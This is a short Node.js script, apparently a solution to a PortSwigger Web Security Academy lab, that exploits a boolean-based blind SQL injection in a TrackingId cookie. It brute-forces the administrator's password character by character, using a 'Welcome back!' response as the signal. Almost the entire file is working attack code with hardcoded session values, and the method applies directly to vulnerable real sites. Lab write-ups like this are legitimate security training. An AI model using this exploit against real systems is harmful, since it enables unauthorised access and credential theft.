#!/usr/bin/env node

import process from 'node:process';

// Global Constants...
const mainUrl = 'https://0aca006e0480626a80aa4ed800c80073.web-security-academy.net/';
const session = 'fAQpIry2n0YtWQLzL9pgAPmsEuftQMso';
const trackingId = 'Bd9Xz2tIQXynqKDA';

process.on('SIGINT', () => {
  console.log('\n[!] Saliendo...\n');
  process.exit(1);
});

const request = async (sqlQuery, retries = 10, delay = 1000) => {
  for (let attempt = 1; attempt <= retries; attempt++) {
    try {
      const response = await fetch(mainUrl, {
        method: 'GET',
        headers: {
          'Cookie': `TrackingId=${trackingId}${sqlQuery}; session=${session}`,
        },
      });

      if (!response.ok) {
        throw new Error(`HTTP ${response.status} ${response.statusText}`)
      }

      return await response.text();
    } catch (e) {
      if (attempt < retries) {
        await new Promise(res => setTimeout(res, delay));
      } else {
        throw new Error(`[!] Todos los intentos fallaron: ${e.message}`);
      }
    }
  }
}

const main = async () => {
  let response;
  let length = 20;
  let result = '';
  
  for (let position = 1; position < length + 1; position++) {
    for (let character = 0; character < 128; character++) {
      const query = `' and (select ascii(substring(password, ${position}, 1)) from users where username='administrator')=${character}-- -`;
      response = await request(query);

      process.stdout.write(`\r[+] Result: ${result} | Position: ${position} - Character: ${character}`);

      if (response.includes('Welcome back!')) {
        result += String.fromCharCode(character);
        (position === length) && process.stdout.write(`\r[+] Success: ${result}\n`);
        break;
      }
    }
  }
}

(async () => {
  await main();
})();
